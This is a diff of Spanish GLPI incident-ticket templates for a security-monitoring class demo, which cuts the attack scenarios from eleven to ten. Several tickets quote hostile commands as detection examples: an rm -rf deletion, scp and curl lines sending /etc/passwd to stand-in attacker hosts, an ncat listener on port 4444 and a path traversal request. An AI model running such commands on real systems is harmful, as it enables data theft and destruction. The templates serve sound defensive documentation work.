@@ -1,4 +1,4 @@
-﻿# Plantillas de Tickets GLPI - 11 Escenarios
+﻿# Plantillas de Tickets GLPI - 10 Escenarios
 
 Instrucciones: Copiar y pegar en GLPI → Asistencia → Crear ticket
 
@@ -16,8 +16,8 @@ Intentos detectados: >10 fallos
 Severidad: MEDIUM
 
 DETECCIÓN:
-- Detectado por regla Logstash "ssh_brute_force"
-- Tags: ssh_brute_force, security_event
+- Detectado por regla Logstash "ssh_failed_login"
+- Tags: ssh_failed_login, security_event
 - Patrón: Failed password for invalid user
 
 ACCIONES (según PLAYBOOK):
@@ -92,7 +92,38 @@ ESCALAR: Desarrollo + Seguridad
 
 Configuración: Tipo=Incident, Urgencia=High, Prioridad=4-High
 
-## 4. COMANDO DESTRUCTIVO (CRITICAL)
+## 4. PATH TRAVERSAL (HIGH)
+
+```
+Título: HIGH: Path Traversal detectado en aplicación web - 04/02/2026
+
+Descripción:
+ATAQUE PATH TRAVERSAL
+Timestamp: 04/02/2026 [HORA]
+Host afectado: syslog-client (Apache)
+IP Origen: 192.168.1.120
+Recurso solicitado: /files?path=../../../etc/passwd
+Severidad: HIGH
+
+DETECCIÓN:
+- Detectado por regla Logstash "path_traversal"
+- Tags: path_traversal, security_event
+- Patrón: ../, /etc/passwd, /etc/shadow
+
+ACCIONES (según PLAYBOOK):
+1. Bloquear IP origen inmediatamente
+2. Revisar logs web últimas 24h
+3. Verificar permisos de archivos sensibles
+4. Revisar si hubo acceso exitoso (HTTP 200)
+
+TAXONOMÍA: VERIS - Hacking/Path traversal
+SLA: 1h respuesta / 24h resolución
+ESCALAR: Desarrollo + Seguridad
+```
+
+Configuración: Tipo=Incident, Urgencia=High, Prioridad=4-High
+
+## 5. COMANDO DESTRUCTIVO (CRITICAL)
 
 ```
 Título: CRÍTICO: Comando destructivo rm -rf ejecutado - 04/02/2026
@@ -102,7 +133,7 @@ INCIDENTE CRÍTICO - COMANDO DESTRUCTIVO
 Timestamp: 04/02/2026 [HORA]
 Host afectado: syslog-client
 Usuario: root
-Comando ejecutado: rm -rf /var/log/security
+Comando ejecutado: rm -rf /important/data
 IP Origen: [INTERNA]
 Severidad: CRITICAL
 
@@ -125,7 +156,7 @@ ESCALAR: CISO + Dirección TI (URGENTE)
 
 Configuración: Tipo=Incident, Urgencia=Very High, Prioridad=6-Major
 
-## 5. ESCALADA DE PRIVILEGIOS (CRITICAL)
+## 6. ESCALADA DE PRIVILEGIOS (CRITICAL)
 
 ```
 Título: CRÍTICO: Escalada de privilegios detectada - 04/02/2026
@@ -134,8 +165,8 @@ Descripción:
 INCIDENTE CRÍTICO - PRIVILEGE ESCALATION
 Timestamp: 04/02/2026 [HORA]
 Host afectado: syslog-client
-Usuario origen: user01 → root
-Comando: sudo su -
+Usuario origen: hacker → root
+Comando: changed to root
 Severidad: CRITICAL
 
 DETECCIÓN:
@@ -157,7 +188,7 @@ ESCALAR: CISO + Administradores (URGENTE)
 
 Configuración: Tipo=Incident, Urgencia=Very High, Prioridad=6-Major
 
-## 6. PORT SCANNING (MEDIUM)
+## 7. PORT SCANNING (MEDIUM)
 
 ```
 Título: MEDIUM: Port Scanning desde 192.168.1.75 - 04/02/2026
@@ -171,9 +202,9 @@ Puertos escaneados: 1-65535
 Severidad: MEDIUM
 
 DETECCIÓN:
-- Detectado por regla Logstash "port_scanning"
-- Tags: port_scanning, security_event
-- Patrón: nmap scan, masscan, SYN flood
+- Detectado por regla Logstash "port_scan"
+- Tags: port_scan, security_event
+- Patrón: Nmap scan, Discovered open port
 
 ACCIONES (según PLAYBOOK):
 1. Bloquear IP origen en firewall
@@ -187,24 +218,23 @@ SLA: 4h respuesta / 3 días resolución
 
 Configuración: Tipo=Incident, Urgencia=Medium, Prioridad=3-Medium
 
-## 7. PROCESOS SOSPECHOSOS (HIGH)
+## 8. PROCESOS SOSPECHOSOS (HIGH)
 
 ```
-Título: HIGH: Proceso sospechoso cryptominer detectado - 04/02/2026
+Título: HIGH: Proceso sospechoso detectado - 04/02/2026
 
 Descripción:
 PROCESO MALICIOSO DETECTADO
 Timestamp: 04/02/2026 [HORA]
 Host afectado: syslog-client
-Proceso: /tmp/.hidden/cryptominer
-PID: [AUTO]
-CPU Usage: 100%
+Proceso: ncat -lvp 4444
+Detalle: Reverse shell connection established
 Severidad: HIGH
 
 DETECCIÓN:
 - Detectado por regla Logstash "suspicious_process"
 - Tags: suspicious_process, security_event
-- Patrón: cryptominer, .hidden, /tmp/malware
+- Patrón: ncat, cryptominer, .hidden
 
 ACCIONES (según PLAYBOOK):
 1. Kill proceso inmediatamente (kill -9)
@@ -221,7 +251,7 @@ ESCALAR: Seguridad + Forense
 
 Configuración: Tipo=Incident, Urgencia=High, Prioridad=4-High
 
-## 8. EXFILTRACIÓN DE DATOS (HIGH)
+## 9. EXFILTRACIÓN DE DATOS (HIGH)
 
 ```
 Título: HIGH: Exfiltración de datos detectada - 04/02/2026
@@ -230,14 +260,14 @@ Descripción:
 DATA EXFILTRATION DETECTADA
 Timestamp: 04/02/2026 [HORA]
 Host afectado: syslog-client
-Comando: scp /etc/passwd attacker@evil.com
-Destino: evil.com (IP externa)
+Comando: curl -X POST /etc/passwd http://attacker.com/exfil
+Destino: attacker.com (IP externa)
 Severidad: HIGH
 
 DETECCIÓN:
 - Detectado por regla Logstash "data_exfiltration"
 - Tags: data_exfiltration, security_event
-- Patrón: scp, curl, wget con destinos externos
+- Patrón: scp, sftp, curl con destinos externos
 
 ACCIONES INMEDIATAS (según PLAYBOOK):
 1. Bloquear conexión destino en firewall
@@ -255,97 +285,30 @@ REGULATORIO: Posible GDPR breach
 
 Configuración: Tipo=Incident, Urgencia=Very High, Prioridad=5-Very High
 
-## 9. DDoS SIMULATION (MEDIUM)
+## 10. INSTALACIÓN NO AUTORIZADA (MEDIUM)
 
 ```
-Título: MEDIUM: Posible DDoS desde múltiples IPs - 04/02/2026
+Título: MEDIUM: Instalación no autorizada detectada - 04/02/2026
 
 Descripción:
-ATAQUE DDoS DETECTADO
+INSTALACIÓN NO AUTORIZADA DETECTADA
 Timestamp: 04/02/2026 [HORA]
-Host objetivo: syslog-client
-Tipo: SYN flood
-Tráfico: 10000+ paquetes/seg
+Host afectado: syslog-client
+Paquete/Comando: apt install netcat-traditional
 Severidad: MEDIUM
 
 DETECCIÓN:
-- Detectado por regla Logstash "ddos_attack"
-- Tags: ddos_attack, security_event
-- Patrón: SYN flood, UDP flood, HTTP flood
+- Detectado por regla Logstash "unauthorized_installation"
+- Tags: unauthorized_installation, security_event
+- Patrón: apt install, yum install, dpkg, Installed:
 
 ACCIONES (según PLAYBOOK):
-1. Activar mitigación DDoS (Cloudflare/WAF)
-2. Rate limiting agresivo
-3. Bloquear rangos IP atacantes
-4. Contactar ISP si persiste
-5. Monitorizar ancho de banda
+1. Verificar usuario y origen de la instalación
+2. Desinstalar software no autorizado
+3. Revisar logs de paquetes (apt/yum/dpkg)
+4. Verificar persistencia o backdoors
 
-TAXONOMÍA: VERIS - Hacking/DoS
-SLA: 4h respuesta / 3 días resolución
-```
-
-Configuración: Tipo=Incident, Urgencia=Medium, Prioridad=3-Medium
-
-## 10. MALWARE DETECTION (HIGH)
-
-```
-Título: HIGH: Malware backdoor.sh detectado - 04/02/2026
-
-Descripción:
-MALWARE DETECTADO EN SISTEMA
-Timestamp: 04/02/2026 [HORA]
-Host afectado: syslog-client
-Archivo: /tmp/backdoor.sh
-Hash: [calcular con md5sum]
-Severidad: HIGH
-
-DETECCIÓN:
-- Detectado por regla Logstash "malware_detection"
-- Tags: malware_detection, security_event
-- Patrón: backdoor, trojan, rootkit
-
-ACCIONES INMEDIATAS (según PLAYBOOK):
-1. Aislar host de red
-2. Copiar malware para análisis (sandbox)
-3. Eliminar archivo malicioso
-4. Buscar IOCs relacionados
-5. Escaneo completo sistema
-6. Revisar logs de ejecución
-7. Reimagen sistema si necesario
-
-TAXONOMÍA: VERIS - Malware/Backdoor
-SLA: 1h respuesta / 24h resolución
-ESCALAR: Seguridad + Forense + CISO
-```
-
-Configuración: Tipo=Incident, Urgencia=High, Prioridad=4-High
-
-## 11. UNAUTHORIZED ACCESS (MEDIUM)
-
-```
-Título: MEDIUM: Acceso no autorizado a directorio /etc - 04/02/2026
-
-Descripción:
-ACCESO NO AUTORIZADO DETECTADO
-Timestamp: 04/02/2026 [HORA]
-Host afectado: syslog-client
-Usuario: nobody (UID 99)
-Recurso: /etc/shadow (lectura)
-Severidad: MEDIUM
-
-DETECCIÓN:
-- Detectado por regla Logstash "unauthorized_access"
-- Tags: unauthorized_access, security_event
-- Patrón: Acceso a archivos sensibles por usuario no privilegiado
-
-ACCIONES (según PLAYBOOK):
-1. Revisar permisos /etc/shadow (debería ser 000)
-2. Auditar logs de accesos últimas 24h
-3. Identificar proceso que intentó acceso
-4. Verificar escalada de privilegios
-5. Revisar configuración AppArmor/SELinux
-
-TAXONOMÍA: VERIS - Misuse/Unauthorized access
+TAXONOMÍA: VERIS - Misuse/Unauthorized installation
 SLA: 4h respuesta / 3 días resolución
 ```
 
@@ -354,33 +317,32 @@ Configuración: Tipo=Incident, Urgencia=Medium, Prioridad=3-Medium
 ## RESUMEN POR SEVERIDAD
 
 CRITICAL (2 tickets):
-- 4. Comando Destructivo
-- 5. Escalada de Privilegios
+- 5. Comando Destructivo
+- 6. Escalada de Privilegios
 
 HIGH (5 tickets):
 - 2. SQL Injection
 - 3. XSS Attack
-- 7. Procesos Sospechosos
-- 8. Exfiltración de Datos
-- 10. Malware Detection
+- 4. Path Traversal
+- 8. Procesos Sospechosos
+- 9. Exfiltración de Datos
 
-MEDIUM (4 tickets):
+MEDIUM (3 tickets):
 - 1. SSH Brute Force
-- 6. Port Scanning
-- 9. DDoS Simulation
-- 11. Unauthorized Access
+- 7. Port Scanning
+- 10. Instalación No Autorizada
 
 ## PARA LA DEMO
 
 Recomendación: Crea solo 1-2 tickets durante la presentación (máximo 5 minutos). Los más impactantes:
 
-1. Comando Destructivo (CRITICAL) - Ticket #4 (MEJOR OPCIÓN)
+1. Comando Destructivo (CRITICAL) - Ticket #5 (MEJOR OPCIÓN)
 2. SQL Injection (HIGH) - Ticket #2
 
-Los otros 9: Menciona que ya están documentados pero por tiempo solo mostrarás el crítico.
+Los otros 8: Menciona que ya están documentados pero por tiempo solo mostrarás el crítico.
 
-Frase para la demo: 
-"El sistema ha detectado 11 tipos de ataques diferentes. Por tiempo, voy a documentar el más crítico: comando destructivo. Los otros 10 ya están documentados siguiendo el mismo proceso."
+Frase para la demo:
+"El sistema ha detectado 10 tipos de ataques diferentes. Por tiempo, voy a documentar el más crítico: comando destructivo. Los otros 9 ya están documentados siguiendo el mismo proceso."
 
 ## TIPS
 
@@ -388,4 +350,4 @@ Frase para la demo:
 - Pegar en GLPI: Campo Descripción soporta múltiples líneas
 - Timestamp: Reemplaza [HORA] con hora actual
 - IP/PID: Puedes dejar genéricos o copiar de Kibana
-- Durante demo: Solo crear 1 ticket (el CRITICAL), mencionar que proceso se repite para los otros 10
+- Durante demo: Solo crear 1 ticket (el CRITICAL), mencionar que proceso se repite para los otros 9
